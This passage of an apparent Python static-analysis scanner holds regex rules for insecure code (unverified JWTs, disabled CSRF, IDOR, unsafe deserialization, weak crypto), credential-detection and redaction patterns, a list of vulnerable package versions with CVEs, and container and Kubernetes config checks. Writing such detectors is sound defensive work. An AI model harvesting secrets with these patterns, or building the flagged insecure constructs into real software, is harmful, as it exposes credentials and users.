           ("java", r"""MessageDigest\.getInstance\s*\(\s*["'](?:MD5|SHA-?1)["']\s*\)[^\n]*"""
                    r"""(?:password|passwd)"""),
           ("kotlin", r"""MessageDigest\.getInstance\s*\(\s*["'](?:MD5|SHA-?1)["']\s*\)[^\n]*"""
                      r"""(?:password|passwd)"""),
           ("csharp", r"(?:MD5|SHA1)\.Create\(\)|FormsAuthentication\.HashPasswordForStoringInConfigFile"),
           ("go", r"""\b(?:md5|sha1)\.(?:New|Sum)\b[^\n]*(?:password|passwd)""")),
          "A password is hashed with a general-purpose digest, which is far too fast to resist "
          "offline cracking.", confidence="HIGH"),
    _rule("jwt-no-verify", "weak_jwt_validation", "JWT decoded without signature verification",
          (("python", r"""jwt\.decode\s*\([^)\n]*(?:verify\s*=\s*False|options\s*=\s*\{[^}]*"""
                      r"""['\"]verify_signature['\"]\s*:\s*False)"""),
           ("python", r"""jwt\.decode\s*\([^)\n]*algorithms\s*=\s*\[\s*['\"]none"""),
           ("javascript", r"""jwt\.decode\s*\(|jsonwebtoken\.decode\s*\("""),
           ("typescript", r"""jwt\.decode\s*\(|jsonwebtoken\.decode\s*\("""),
           ("javascript", r"""algorithms\s*:\s*\[\s*['\"]none"""),
           ("java", r"""\.setSigningKey\([^)]*\)[\s\S]{0,80}?parseClaimsJwt|Jwts\.parser\(\)\.parse"""),
           ("php", r"""JWT::decode\s*\([^)]*,\s*null"""),
           ("ruby", r"""JWT\.decode\s*\([^)]*,\s*nil""")),
          "Token claims are trusted without verifying the signature, or the 'none' algorithm is "
          "allowed.",
          confidence="HIGH"),
    _rule("session-insecure-cookie", "session_management", "Insecure session cookie attributes",
          (("python", r"""SESSION_COOKIE_(?:HTTPONLY|SECURE)\s*=\s*False"""),
           ("python", r"""session\.cookie_httponly\s*=\s*False|session\.cookie_secure\s*=\s*False"""),
           ("javascript", r"""cookie\s*\(\s*\{[^}]*secure\s*:\s*false[^}]*\}"""),
           ("javascript", r"""httpOnly\s*:\s*false|sameSite\s*:\s*['"]none['"]"""),
           ("python", r"""SECRET_KEY\s*=\s*['"][^'"]{8,}['"]"""),
           ("php", r"""session\.cookie_httponly\s*=\s*0|session\.cookie_secure\s*=\s*0"""),
           ("java", r"""setHttpOnly\s*\(\s*false|setSecure\s*\(\s*false""")),
          "A session cookie is readable by script, sent over plaintext, or the signing secret is a "
          "literal in the repository.",
          confidence="MEDIUM", max_per_file=10),

    # ------------------------------------------------------------- AuthZ --
    _rule("csrf-disabled", "csrf", "CSRF protection disabled",
          (("python", r"""@csrf_exempt|csrf_exempt\s*\(|WTF_CSRF_ENABLED\s*=\s*False|"""
                      r"""CsrfViewMiddleware['\"]\s*\)?"""),
           ("javascript", r"""csrf\s*:\s*false|csrfProtection\s*:\s*false"""),
           ("java", r"""csrf\s*\(\s*\)\s*\.\s*disable\(\)|\.csrf\(\)\.disable\(\)"""),
           ("php", r"""['\"]csrf['\"]\s*=>\s*false|\$request->validate\s*\(\s*\[\s*\]"""),
           ("ruby", r"""skip_before_action\s*:verify_authenticity_token|protect_from_forgery\s*with:\s*:null_session"""),
           ("csharp", r"""[Ii]gnoreAntiforgeryToken|AutoValidateAntiforgeryTokenAttribute\s*\(\s*\)""")),
          "The framework's anti-CSRF mechanism is explicitly turned off for code that mutates "
          "state.", confidence="HIGH"),
    _rule("permit-all", "missing_function_level_authorization", "Authorization opened to everyone",
          (("java", r"""\.permitAll\(\)|@PreAuthorize\s*\(\s*['\"]permitAll"""),
           ("csharp", r"""\[AllowAnonymous\]"""),
           ("python", r"""@login_not_required|permission_classes\s*=\s*\[\s*\]|"""
                      r"""AllowAny"""),
           ("javascript", r"""authorize\s*:\s*\(\s*\)\s*=>\s*true""")),
          "An authorisation rule admits anonymous or any authenticated caller, which is only safe "
          "for genuinely public endpoints.", confidence="MEDIUM", max_per_file=10),
    _rule("auth-disabled", "missing_authentication", "Authentication explicitly disabled",
          (("python", r"""(?i)\b(?:skip_?auth|disable_?auth|auth_?disabled|no_?auth)\b\s*[=:]\s*(?:True|true|1)|\bAUTH_REQUIRED\s*[=:]\s*(?:False|false|0)"""),
           ("javascript", r"""(?i)\b(?:skipAuth|disableAuth|authDisabled|noAuth)\b\s*[=:]\s*true"""),
           ("typescript", r"""(?i)\b(?:skipAuth|disableAuth|authDisabled|noAuth)\b\s*[=:]\s*true"""),
           ("go", r"""(?i)\b(?:SkipAuth|DisableAuth|AuthDisabled)\b\s*[=:]\s*true"""),
           ("ruby", r"""(?i)\b(?:skip_auth|disable_auth|auth_disabled)\b\s*(?:=\s*true|\?\s*$)|\bskip_before_action\s+:authenticate"""),
           ("php", r"""(?i)\b(?:skip_auth|disable_auth|auth_disabled)\b\s*=\s*true"""),
           ("java", r"""(?i)\b(?:skipAuth|disableAuth|authDisabled)\b\s*=\s*true|\.permitAll\(\s*\)\s*;\s*//\s*auth"""),
           ("csharp", r"""(?i)\b(?:SkipAuth|DisableAuth|AuthDisabled)\b\s*=\s*true"""),),
          "Authentication is switched off by a configuration value or a bypass flag, so the "
          "route accepts anonymous callers.", confidence="HIGH", max_per_file=5),
    _rule("auth-identity-header", "missing_authentication",
          "Identity taken from an unverified request header",
          (("python", r"""(?:request\.headers|request\.get_header)\s*(?:\[|\(\s*)\s*['\"]X-(?:User-?Id|Remote-User|Authenticated-User|Forwarded-User|User)['\"]"""),
           ("javascript", r"""headers?\s*\[\s*['\"]x-(?:user-?id|remote-user|authenticated-user|forwarded-user)['\"]\s*\]"""),
           ("typescript", r"""headers?\s*\[\s*['\"]x-(?:user-?id|remote-user|authenticated-user|forwarded-user)['\"]\s*\]"""),
           ("go", r"""r\.Header\.Get\s*\(\s*\"X-(?:User-?Id|Remote-User|Authenticated-User|Forwarded-User)\"\s*\)"""),
           ("ruby", r"""request\.headers\s*\[\s*['\"]X-(?:User-?Id|Remote-User|Authenticated-User|Forwarded-User)['\"]"""),
           ("php", r"""\$_(?:SERVER|REQUEST)\s*\[\s*['\"]HTTP_X_(?:USER_ID|REMOTE_USER|AUTHENTICATED_USER|FORWARDED_USER)['\"]"""),
           ("java", r"""getHeader\s*\(\s*\"X-(?:User-?Id|Remote-User|Authenticated-User|Forwarded-User)\"\s*\)"""),
           ("csharp", r"""Headers\s*\[\s*\"X-(?:User-?Id|Remote-User|Authenticated-User|Forwarded-User)\"\s*\]"""),),
          "The caller's identity is read from a header any client can set, so the caller can "
          "choose which user they are unless a trusted proxy strips and re-signs it.",
          confidence="MEDIUM", max_per_file=10),
    _rule("authz-role-from-client", "missing_authorization",
          "Role or permission taken from the request",
          (("python", r"""(?:is_admin|is_superuser|is_staff|role|permissions?|scopes?)\s*=\s*(?:request\.(?:json|form|POST|GET|args|values)|req\.)"""),
           ("javascript", r"""(?:isAdmin|is_admin|role|permissions?|scopes?)\s*=\s*req\.(?:body|query|params)"""),
           ("typescript", r"""(?:isAdmin|is_admin|role|permissions?|scopes?)\s*=\s*req\.(?:body|query|params)"""),
           ("php", r"""\$(?:role|is_admin|permissions?)\s*=\s*\$_(?:POST|GET|REQUEST)"""),
           ("ruby", r"""(?:role|admin|is_admin)\s*=\s*params\["""),
           ("java", r"""(?:role|isAdmin|authorities|permissions?)\s*=\s*request\.getParameter"""),
           ("csharp", r"""(?:Role|IsAdmin|Permissions)\s*=\s*Request"""),
           ("go", r"""(?:role|isAdmin|is_admin|permissions?)\s*:?=\s*(?:r\.FormValue|c\.(?:Param|Query|PostForm))"""),),
          "Permission is decided from a value the client sends, so the client grants itself the "
          "role it asks for.", confidence="HIGH", max_per_file=10),
    _rule("authz-check-commented", "missing_authorization", "Authorization check commented out",
          (("python", r"""#\s*(?:@login_required|@requires_auth|@permission_required|if\s+(?:not\s+)?current_user|abort\(\s*403)"""),
           ("javascript", r"""//\s*(?:if\s*\(\s*!?\s*(?:req|request)\.user|requireRole|ensureAdmin|authorize\()"""),
           ("typescript", r"""//\s*(?:if\s*\(\s*!?\s*(?:req|request)\.user|requireRole|ensureAdmin|authorize\()"""),
           ("ruby", r"""#\s*(?:before_action\s+:authenticate|authorize\s+:)"""),
           ("php", r"""//\s*(?:if\s*\(\s*!\s*\$?\w*admin|is_admin)"""),
           ("java", r"""//\s*(?:@PreAuthorize|@RolesAllowed|checkPermission)"""),
           ("csharp", r"""//\s*(?:\[Authorize|User\.IsInRole)"""),),
          "A permission check exists in the code but is commented out, so the operation runs "
          "with no authorization at all.", confidence="MEDIUM", max_per_file=5),
    _rule("idor-fetch-by-request-id", "idor", "Object loaded by a request-supplied identifier",
          (("python", r"""\.(?:get|get_object_or_404|get_or_404|filter|filter_by|first|one)\s*\(\s*(?:request\.(?:args|form|json|GET|POST|values)|req\.)"""),
           ("javascript", r"""\.(?:findById|findOne|findByPk|findUnique|findByID|get)\s*\(\s*req\.(?:params|query|body)"""),
           ("typescript", r"""\.(?:findById|findOne|findByPk|findUnique|findByID|get)\s*\(\s*req\.(?:params|query|body)"""),
           ("ruby", r"""\.(?:find\w*|where)\s*\(\s*(?:params\[|params\.)"""),
           ("php", r"""->(?:find|findOrFail|where)\s*\(\s*\$_(?:GET|POST|REQUEST)"""),
           ("java", r"""\.(?:findById|getById|findOne|find)\s*\(\s*(?:request\.getParameter|Long\.parseLong\s*\(\s*request|UUID\.fromString\s*\(\s*request)"""),
           ("csharp", r"""\.(?:Find|FirstOrDefault|SingleOrDefault|First)\s*\([^)\n]*Request\.(?:Query|Form|RouteValues)"""),
           ("go", r"""\.(?:First|Find|Where|Get)\s*\([^)\n]*c\.(?:Param|Query|PostForm)"""),),
          "A record is fetched by an identifier taken straight from the request; without an "
          "ownership or tenant predicate the caller can address any object (BOLA).",
          severity="High", confidence="MEDIUM"),
    _rule("mass-assignment", "mass_assignment", "Request body bound directly to a model",
          (("python", r"""\.update\s*\(\s*request\.(?:json|form|POST|GET|args)"""),
           ("python", r"""\w+\s*\(\s*\*\*\s*request\.(?:json|form|args)"""),
           ("javascript", r"""Object\.assign\s*\(\s*\w+\s*,\s*req\.body"""),
           ("typescript", r"""Object\.assign\s*\(\s*\w+\s*,\s*req\.body"""),
           ("ruby", r"""\.update\s*\(\s*params\b|\.update_attributes\s*\(\s*params"""),
           ("php", r"""->(?:update|fill|create)\s*\(\s*\$request->all\(\)"""),
           ("java", r"""BeanUtils\.copyProperties\s*\([^)]*request"""),
           ("csharp", r"""TryUpdateModel\s*\(|\.Update\s*\(\s*Request""")),
          "The whole request payload is applied to a model, so any field the client adds is "
          "written.", confidence="HIGH"),

    # ------------------------------------------------------------- Logic --
    _rule("client-price", "business_logic", "Security-relevant value taken from the client",
          (("python", r"""(?:price|amount|total|quantity|qty|discount|credit)\s*=\s*"""
                      r"""(?:request\.|float\s*\(\s*request|int\s*\(\s*request)"""),
           ("javascript", r"""(?:price|amount|total|quantity|qty|discount|credit)\s*=\s*"""
                          r"""req\.(?:body|query|params)"""),
           ("typescript", r"""(?:price|amount|total|quantity|discount|credit)\s*=\s*"""
                          r"""req\.(?:body|query|params)"""),
           ("php", r"""\$(?:price|amount|total|quantity|discount|role)\s*=\s*\$_(?:POST|GET|REQUEST)"""),
           ("ruby", r"""(?:price|amount|total|quantity|discount|role)\s*=\s*params\["""),
           ("java", r"""(?:price|amount|total|quantity|discount|role)\s*=\s*request\.getParameter"""),
           ("csharp", r"""(?:Price|Amount|Total|Quantity|Discount)\s*=\s*Request""")),
          "The server accepts a value that determines money, entitlement or privilege directly "
          "from the client.", confidence="MEDIUM"),
    _rule("race-balance", "race_condition", "Check-then-write on a balance or stock value",
          (("python", r"""if\s+[^\n]*(?:balance|stock|quantity|seats|credits)\s*(?:>=|>)[^\n]*:\s*\n"""
                      r"""(?:[^\n]*\n){0,4}?[^\n]*\.(?:save|update|commit)\s*\("""),
           ("javascript", r"""if\s*\([^\n]*(?:balance|stock|quantity|seats)\s*(?:>=|>)[^\n]*"""
                          r"""\)\s*\{[\s\S]{0,300}?\.(?:save|update|updateOne)\s*\("""),
           ("java", r"""if\s*\([^\n]*(?:balance|stock|quantity)\s*(?:>=|>)[^\n]*\)\s*\{"""
                    r"""[\s\S]{0,300}?\.(?:save|update)\s*\(""")),
          "A limit is read and then written in separate statements, with no atomic conditional "
          "update between them.", confidence="LOW", max_per_file=5),
    _rule("weak-random", "weak_randomness", "Security token from a non-cryptographic PRNG",
          (("python", r"""\brandom\.(?:random|randint|randrange|choice|choices|getrandbits)\s*\([^\n]*"""
                      r"""(?:token|secret|password|otp|salt|nonce|key)"""),
           ("javascript", r"""Math\.random\(\)[^\n]*(?:token|otp|nonce|secret|password)"""),
           ("typescript", r"""Math\.random\(\)[^\n]*(?:token|otp|nonce|secret|password)"""),
           ("php", r"""\b(?:rand|mt_rand|uniqid)\s*\([^\n]*(?:token|otp|password|reset)"""),
           ("java", r"""new\s+(?:java\.util\.)?Random\s*\([^\n]*(?:token|otp|password|reset)"""),
           ("ruby", r"""\b(?:rand|Random\.rand)\b[^\n]*(?:token|otp|password)"""),
           ("go", r"""\bmath/rand\b[^\n]*(?:token|otp|password)|\brand\.(?:Int|Intn)\b[^\n]*"""
                  r"""(?:token|otp|secret)""")),
          "A predictable PRNG is used where an unguessable value is required.",
          confidence="HIGH"),
    _rule("broken-cipher", "broken_crypto", "Obsolete cipher, ECB mode or static IV",
          (("python", r"""MODE_ECB|AES\.new\([^)]*\)\s*\.encrypt|DES\.new|ARC4|"""
                      r"""iv\s*=\s*b?['"][^'"]{8,}['"]"""),
           ("javascript", r"""createCipheriv\s*\(\s*['"](?:des|des-ede|rc4|aes-\d+-ecb)"""),
           ("javascript", r"""createCipher\s*\(|createDecipher\s*\("""),
           ("java", r"""Cipher\.getInstance\s*\(\s*["'](?:AES|DES|DESede|RC4|Blowfish)["']\s*\)"""),
           ("java", r"""Cipher\.getInstance\s*\(\s*["'][^"']*\/ECB\/"""),
           ("php", r"""openssl_encrypt\s*\([^)]*['"](?:des|rc4|aes-128-ecb|aes-256-ecb)"""),
           ("ruby", r"""OpenSSL::Cipher\.new\s*\(\s*['"](?:des|rc4|aes-\d+-ecb)"""),
           ("csharp", r"""CipherMode\.ECB|DESCryptoServiceProvider|RC2CryptoServiceProvider"""),
           ("go", r"""cipher\.NewCBCDecrypter[\s\S]{0,80}?\[\]byte\s*\(\s*["']""")),
          "A cipher mode or algorithm that leaks structure (ECB) or is obsolete (DES, RC4) is used, "
          "or the IV is a constant.", confidence="HIGH"),
    _rule("log-secret", "sensitive_data_exposure", "Credential written to logs",
          (("python", r"""(?:print|logging\.\w+|logger\.\w+|log\.\w+)\s*\([^\n]*"""
                      r"""(?:password|passwd|secret|api_key|token|authorization)"""),
           ("javascript", r"""console\.(?:log|info|debug|error)\s*\([^\n]*(?:password|secret|token)"""),
           ("typescript", r"""console\.(?:log|info|debug|error)\s*\([^\n]*(?:password|secret|token)"""),
           ("ruby", r"""(?:Rails\.logger|puts|logger)\.\w*[^\n]*(?:password|secret|token)"""),
           ("php", r"""(?:error_log|print_r|var_dump)\s*\([^\n]*(?:password|secret|token)"""),
           ("java", r"""(?:System\.out\.print\w*|log(?:ger)?\.\w+)\s*\([^\n]*(?:password|secret|token)"""),
           ("csharp", r"""(?:Console\.WriteLine|_logger\.\w+|Log\.\w+)\s*\([^\n]*(?:password|secret|token)""")),
          "A secret is written to a log sink, which usually has broader access than the secret "
          "store.", confidence="MEDIUM", max_per_file=10),

    # ------------------------------------------------------ Deserialization --
    _rule("unsafe-deserialization", "insecure_deserialization", "Untrusted data deserialized natively",
          (("python", r"""pickle\.(?:loads?|Unpickler)|cPickle\.loads?|jsonpickle\.decode|"""
                      r"""yaml\.load\s*\((?![^)\n]*SafeLoader)|shelve\.open"""),
           ("javascript", r"""\bunserialize\s*\(|node-serialize|require\(['"]node-serialize"""),
           ("ruby", r"""Marshal\.(?:load|restore)\b|YAML\.load\s*\((?![^)]*safe)"""),
           ("php", r"""\bunserialize\s*\(\s*\$"""),
           ("java", r"""new\s+ObjectInputStream|readObject\s*\(\s*\)|XStream\(\)\.fromXML"""),
           ("kotlin", r"""new\s+ObjectInputStream|readObject\s*\(\s*\)"""),
           ("csharp", r"""BinaryFormatter|LosFormatter|NetDataContractSerializer|TypeNameHandling\.All"""),
           ("go", r"""\bgob\.NewDecoder\(""")),
          "A native object format is used on data that crosses a trust boundary.",
          confidence="HIGH"),
    _rule("webhook-no-signature", "unsigned_update", "Inbound webhook or callback not verified",
          (("python", r"""@app\.(?:route|post)\s*\(\s*['"][^'"]*(?:webhook|callback|hook)['"]"""
                      r"""(?:(?!verify|signature)[\s\S]){0,400}?"""),
           ("javascript", r"""(?:webhook|callback)[\s\S]{0,200}?(?!verify)(?:req\.body)"""),
           ("php", r"""(?:webhook|callback)[\s\S]{0,200}?\$request->all\(\)""")),
          "A webhook handler reads the body without a visible signature check nearby.",
          severity="Medium", confidence="LOW", max_per_file=5),

    # ---------------------------------------------------------- Dependencies --
    # Manifest-based dependency rules are applied by the engine (they need the
    # manifest parsers and version comparison), not by a line regex.
]

#: Secret patterns run in their own pass: the matched value must be redacted
#: before the finding is built, so it is never written to disk.
#:
#: ``(secret_id, pattern, label, marker)``. The *label* is prose and ends up in a
#: finding's note ("A Stripe secret key was found and redacted here"); the
#: *marker* is the word inside the redaction marker and is the single source of
#: truth for how this shape is spelled in every stage's output. They are
#: deliberately separate: a marker has to read well in a code excerpt
#: (``[REDACTED STRIPE KEY]``), a label has to read well in a sentence ("Stripe
#: secret key"), and deriving one from the other produced two spellings for one
#: shape in one report.
SECRET_PATTERNS: Tuple[Tuple[str, str, str, str], ...] = (
    ("aws-access-key", r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b",
     "AWS access key id", "AWS KEY ID"),
    # The block is matched to its END delimiter when there is one: replacing only
    # the header would leave the key material itself in the excerpt.
    ("private-key-block",
     r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----"
     r"(?:[\s\S]*?-----END (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----)?",
     "private key block", "PRIVATE KEY"),
    ("github-token", r"\bgh[pousr]_[A-Za-z0-9]{20,}\b", "GitHub token", "GITHUB TOKEN"),
    ("slack-token", r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b", "Slack token", "SLACK TOKEN"),
    ("stripe-key", r"\b(?:sk|rk)_(?:live|test)_[A-Za-z0-9]{16,}\b",
     "Stripe secret key", "STRIPE KEY"),
    ("google-api-key", r"\bAIza[0-9A-Za-z_\-]{35}\b", "Google API key", "GOOGLE API KEY"),
    ("jwt-token", r"\beyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,}\b",
     "JSON Web Token", "JWT"),
    ("generic-assignment",
     r"""(?i)\b(?:password|passwd|pwd|secret|api[_-]?key|apikey|access[_-]?token|auth[_-]?token|"""
     r"""client[_-]?secret|private[_-]?key|encryption[_-]?key|signing[_-]?key)\b\s*[:=]\s*"""
     r"""["'](?P<secret>[^"'\n]{6,120})["']""",
     "credential assigned a literal value", "CREDENTIAL"),
    ("connection-string",
     r"""(?i)\b(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqp|mssql)://[^\s:/@]+:"""
     r"""(?P<secret>[^\s@/]{1,120})@""",
     "connection string with an inline password", "PASSWORD"),
)

#: Package versions with published, high-severity advisories. This is a curated
#: subset, not a vulnerability database: a database-backed scanner (osv-scanner,
#: trivy, npm audit) is preferred when available, and the report says which one
#: produced a dependency finding.
KNOWN_VULNERABLE: Tuple[Dict[str, Any], ...] = (
    {"ecosystem": "npm", "package": "lodash", "below": "4.17.21", "cve": "CVE-2021-23337",
     "title": "lodash command injection through template",
     "cwe": "CWE-1104",
     "url": "https://github.com/advisories/GHSA-35jh-r3h4-6jhm"},
    {"ecosystem": "npm", "package": "minimist", "below": "1.2.6", "cve": "CVE-2021-44906",
     "title": "minimist prototype pollution",
     "cwe": "CWE-1321",
     "url": "https://github.com/advisories/GHSA-xvch-5gv4-984h"},
    {"ecosystem": "npm", "package": "express", "below": "4.17.3", "cve": "CVE-2022-24999",
     "title": "Express qs prototype pollution",
     "cwe": "CWE-1321",
     "url": "https://github.com/advisories/GHSA-hrpp-h998-j3pp"},
    {"ecosystem": "npm", "package": "jsonwebtoken", "below": "9.0.0", "cve": "CVE-2022-23529",
     "title": "jsonwebtoken insecure default verification",
     "cwe": "CWE-347",
     "url": "https://github.com/advisories/GHSA-27h2-hvpr-p6h2"},
    {"ecosystem": "pypi", "package": "django", "below": "3.2.14", "cve": "CVE-2022-34265",
     "title": "Django SQL injection via Trunc/Extract",
     "cwe": "CWE-89",
     "url": "https://github.com/advisories/GHSA-2g9g-7j4c-2v6j"},
    {"ecosystem": "pypi", "package": "pyyaml", "below": "5.4", "cve": "CVE-2020-14343",
     "title": "PyYAML arbitrary code execution through full_load",
     "cwe": "CWE-502",
     "url": "https://github.com/advisories/GHSA-8q59-q68h-6hv4"},
    {"ecosystem": "maven", "package": "org.apache.logging.log4j:log4j-core", "below": "2.17.1",
     "cve": "CVE-2021-44228", "title": "Log4Shell remote code execution",
     "cwe": "CWE-502",
     "url": "https://github.com/advisories/GHSA-jfh8-c2jp-5v3q"},
    {"ecosystem": "maven", "package": "org.springframework:spring-beans", "below": "5.3.18",
     "cve": "CVE-2022-22965", "title": "Spring4Shell remote code execution",
     "cwe": "CWE-94",
     "url": "https://github.com/advisories/GHSA-36p3-wjmg-h94x"},
)


# --------------------------------------------------------------------------- #
# Configuration and infrastructure rules
# --------------------------------------------------------------------------- #
#: These match configuration surfaces rather than application code. They are
#: kept separate from RULES for readability; both lists are executed.
CONFIG_RULES: List[Dict[str, Any]] = [
    _rule("cors-wildcard-credentials", "permissive_cors", "Wildcard or reflected CORS origin",
          (("python", r"""Access-Control-Allow-Origin['"]?\s*[,:=]\s*['"]\*['"]"""),
           ("python", r"""CORS_ORIGIN_ALLOW_ALL\s*=\s*True|allow_origins\s*=\s*\[\s*['"]\*['"]\s*\]"""),
           ("python", r"""CORS_ALLOW_CREDENTIALS\s*=\s*True[\s\S]{0,120}?CORS_ORIGIN_ALLOW_ALL\s*=\s*True"""),
           ("javascript", r"""cors\s*\(\s*\)|origin\s*:\s*true|origin\s*:\s*['"]\*['"]"""),
           ("typescript", r"""origin\s*:\s*true|origin\s*:\s*['"]\*['"]"""),
           ("java", r"""@CrossOrigin\s*\(\s*origins\s*=\s*["']\*["']|allowedOrigins\s*\(\s*["']\*["']"""),
           ("php", r"""['"]Access-Control-Allow-Origin['"]\s*=>\s*['"]\*['"]"""),
           ("csharp", r"""AllowAnyOrigin\s*\(\s*\)"""),
           ("ruby", r"""origins\s+['"]\*['"]"""),
           ("yaml", r"""(?i)allow[-_]?origin[s]?\s*:\s*["']?\*"""),
           ("json", r'(?i)"allow[-_]?origins?"\s*:\s*\[?\s*"\*"')),
          "Any origin, or the caller's origin, is allowed to read responses; with credentials this "
          "is equivalent to handing every site the user's session.",
          confidence="HIGH"),
    _rule("cors-reflection", "permissive_cors", "CORS origin reflected from the request",
          (("javascript", r"""origin\s*:\s*(?:req\.headers\.origin|request\.headers\.origin)"""),
           ("typescript", r"""origin\s*:\s*(?:req\.headers\.origin|request\.headers\.origin)"""),
           ("python", r"""Access-Control-Allow-Origin['"]\]\s*=\s*request\.headers"""),
           ("java", r"""setHeader\s*\(\s*["']Access-Control-Allow-Origin["']\s*,\s*request"""),
           ("php", r"""header\s*\(\s*['"]Access-Control-Allow-Origin:\s*['"]\s*\.\s*\$""")),
          "The Origin header is echoed back, which defeats the purpose of a CORS allow-list.",
          confidence="HIGH"),
    _rule("headers-disabled", "missing_security_headers", "Security-header middleware disabled",
          (("javascript", r"""helmet\s*\(\s*\{[^}]*contentSecurityPolicy\s*:\s*false"""),
           ("javascript", r"""helmet\s*\(\s*\{[^}]*frameguard\s*:\s*false"""),
           ("typescript", r"""contentSecurityPolicy\s*:\s*false"""),
           ("python", r"""SECURE_BROWSER_XSS_FILTER\s*=\s*False|SECURE_CONTENT_TYPE_NOSNIFF\s*=\s*False"""),
           ("python", r"""X_FRAME_OPTIONS\s*=\s*['"]ALLOW"""),
           ("java", r"""\.headers\(\)\s*\.\s*frameOptions\(\)\s*\.\s*disable\(\)"""),
           ("php", r"""header_remove\s*\(\s*['"]X-Frame-Options"""),
           ("csharp", r"""SuppressAntiForgery|Remove\s*\(\s*["']X-Frame-Options""")),
          "A protective header or the middleware that sets it is explicitly removed.",
          confidence="HIGH"),
    _rule("debug-enabled", "debug_mode", "Debug mode enabled in code",
          (("python", r"""\bDEBUG\s*=\s*True|app\.run\s*\([^)]*debug\s*=\s*True|"""
                      r"""app\.config\[['"]DEBUG['"]\]\s*=\s*True"""),
           ("javascript", r"""\bdebug\s*:\s*true|NODE_ENV\s*=\s*['"]development['"]"""),
           ("typescript", r"""\bdebug\s*:\s*true"""),
           ("ruby", r"""config\.consider_all_requests_local\s*=\s*true|config\.action_dispatch\.show_exceptions\s*=\s*true"""),
           ("php", r"""['"]debug['"]\s*=>\s*true|APP_DEBUG\s*=\s*true"""),
           ("java", r"""spring\.profiles\.active\s*=\s*dev|debug\s*=\s*true"""),
           ("csharp", r"""<compilation[^>]*debug\s*=\s*["']true"""),
           ("go", r"""gin\.SetMode\s*\(\s*gin\.DebugMode"""),
           ("yaml", r"""(?mi)^\s*debug\s*:\s*true\s*$"""),
           ("dotenv", r"""(?m)^\s*(?:APP_)?DEBUG\s*=\s*(?:true|1|True)\s*$"""),
           ("ini", r"""(?m)^\s*debug\s*=\s*(?:true|1|on)\s*$""")),
          "A development mode that discloses stack traces or enables an interactive console is "
          "switched on in committed configuration.", confidence="HIGH"),
    _rule("fail-open", "fail_open_error_handling", "Exception swallowed on a security path",
          (("python", r"""except[^\n]*:\s*\n\s*(?:pass|return\s+True|continue)\s*\n"""),
           ("javascript", r"""catch\s*\([^)]*\)\s*\{\s*(?:return\s+true|\}|//)"""),
           ("typescript", r"""catch\s*\([^)]*\)\s*\{\s*(?:return\s+true|\})"""),
           ("java", r"""catch\s*\([^)]*\)\s*\{\s*(?://|\})"""),
           ("php", r"""catch\s*\([^)]*\)\s*\{\s*\}"""),
           ("ruby", r"""rescue\s*(?:StandardError)?\s*(?:=>\s*\w+)?\s*\n\s*(?:nil|return\s+true|end)"""),
           ("csharp", r"""catch\s*(?:\([^)]*\))?\s*\{\s*\}"""),
           ("go", r"""if\s+err\s*!=\s*nil\s*\{\s*(?:_\s*=\s*err|//)""")),
          "An error is ignored and execution continues, so a failed permission or signature check "
          "does not stop the request.",
          confidence="MEDIUM", max_per_file=10, context_lines=15,
          context=r"""(?ix)
            \b(?:auth\w*|permission\w*|privileg\w*|role|acl|token|jwt|oauth|session|login
                 |credential\w*|passw\w*|secret|api_?key|signature|sign|verify\w*|validat\w*
                 |cert\w*|decrypt\w*|encrypt\w*|hmac|csrf|sanitiz\w*|escap\w*|quote
                 |is_admin|current_user|user_?id)\b"""),

    # ------------------------------------------------------------ Container --
    _rule("docker-root-user", "container_security", "Container runs as root",
          (("dockerfile", r"""(?mi)^\s*USER\s+(?:root|0)\s*$"""),),
          "The image sets root as the runtime user.", confidence="HIGH"),
    _rule("docker-latest-tag", "container_security", "Mutable base image tag",
          (("dockerfile", r"""(?mi)^\s*FROM\s+(?!scratch)[^\s:]+(?::latest)?\s*(?:AS\s+\w+)?$"""),),
          "A base image is referenced by a mutable tag (or none), so the same Dockerfile can build "
          "different content over time.", severity="Low", confidence="HIGH", max_per_file=10),
    _rule("docker-privileged", "container_security", "Privileged container or added capabilities",
          (("dockerfile", r"""(?mi)^\s*(?:RUN\s+.*--privileged|ADD\s+https?://)"""),
           ("yaml", r"""(?mi)^\s*privileged\s*:\s*true\s*$"""),
           ("kubernetes", r"""(?mi)^\s*privileged\s*:\s*true\s*$""")),
          "The container is started with full privileges or a remote build context is added "
          "without verification.", confidence="HIGH"),
    _rule("docker-secret-env", "container_security", "Secret baked into the image environment",
          (("dockerfile", r"""(?mi)^\s*(?:ENV|ARG)\s+\w*(?:PASSWORD|SECRET|TOKEN|API_?KEY)\w*\s*[= ]"""),),
          "A credential is stored in the image metadata, where it is visible to anyone who can pull "
          "the image.", confidence="MEDIUM", max_per_file=10),

    # ---------------------------------------------------------- Kubernetes --
    _rule("k8s-privileged", "kubernetes_security", "Privileged pod or host namespace",
          (("yaml", r"""(?mi)^\s*(?:privileged\s*:\s*true|hostNetwork\s*:\s*true|hostPID\s*:\s*true|"""
                     r"""hostIPC\s*:\s*true)\s*$"""),
           ("kubernetes", r"""(?mi)^\s*(?:privileged\s*:\s*true|hostNetwork\s*:\s*true|"""
                            r"""hostPID\s*:\s*true|hostIPC\s*:\s*true)\s*$""")),
          "A workload shares the host kernel namespaces or runs privileged, which makes container "
          "escape trivial.", confidence="HIGH"),
    _rule("k8s-hostpath", "kubernetes_security", "Host filesystem mounted into the pod",
          (("yaml", r"""(?mi)^\s*hostPath\s*:\s*$"""),
           ("kubernetes", r"""(?mi)^\s*hostPath\s*:\s*$""")),
          "A host directory is mounted, so a compromised container can read or modify node files.",
          confidence="HIGH"),
    _rule("k8s-privilege-escalation", "kubernetes_security", "Privilege escalation allowed or root user",
          (("yaml", r"""(?mi)^\s*(?:allowPrivilegeEscalation\s*:\s*true|runAsUser\s*:\s*0|"""
                     r"""runAsNonRoot\s*:\s*false)\s*$"""),
           ("kubernetes", r"""(?mi)^\s*(?:allowPrivilegeEscalation\s*:\s*true|runAsUser\s*:\s*0|"""
                            r"""runAsNonRoot\s*:\s*false)\s*$""")),
          "The pod may gain more privileges than its entry point, or runs explicitly as root.",
          confidence="HIGH"),
    _rule("k8s-caps", "kubernetes_security", "All capabilities added or hostPort exposed",
